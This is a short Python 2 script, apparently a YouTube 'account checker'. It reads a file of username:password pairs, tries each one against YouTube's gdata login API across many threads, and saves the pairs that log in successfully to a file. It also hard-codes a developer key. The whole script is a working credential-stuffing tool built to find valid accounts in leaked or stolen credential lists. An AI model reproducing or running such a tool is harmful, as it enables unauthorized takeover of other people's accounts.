import gdata.youtube
import gdata.youtube.service
import threading
class YoutubeBot:
    def __init__(self):
        self.yt_service = gdata.youtube.service.YouTubeService()
        self.yt_service.developer_key = 'AI39si6VAaDCexeGWcT83JbEVJBiInbk3EZwpEQ6enrk59-UwFcsfc4LPGS5XXI99ieP-2hGrglDB3UrkqWJdLy9Pt6Gm92ZlA'
        self.yt_service.source = 'Testing'
        self.yt_service.client_id = 'my-example-application'

    def accountchecker(self, filez, filetosaveto):
        for a in filez:
                try:
                    cont = a.rsplit()[0].split(':')
                    user = cont[0]
                    pwd = cont[1]
                    self.yt_service.email = user
                    self.yt_service.password = pwd
                    try:
                        self.yt_service.ProgrammaticLogin()
                        print "Account " + user + " is working"
                        openned = open(filetosaveto, 'a')
                        openned.write(user+ ":" + pwd)
                        openned.write('\n')
                        openned.close()
                    except:
                        print "Could not login with " + user
                        continue

                except:
                    print "Could not login with " + user

def chunkIt(seq, num):
	avg = len(seq) / float(num)
	out = []
	last = 0.0
	while last < len(seq):
		out.append(seq[int(last):int(last + avg)])
		last += avg
	return out          

Mybot = YoutubeBot()
filex = open(raw_input("Enter the name of the file with the accounts to check:\n")).readlines()
filetosaveto = raw_input("Enter the name of the file to save the working accounts to:\n")
nbthreads = input("Number of threads: ")
if len(filex) > nbthreads:
    z = chunkIt(filex, nbthreads)
    for passz in z:
        threading.Thread(target=Mybot.accountchecker, args=(passz, filetosaveto)).start()
else:
    print "You do not have enough accounts for this number of threads"
    threading.Thread(target=Mybot.accountchecker, args=(filex, filetosaveto)).start()
while 1:
    pass
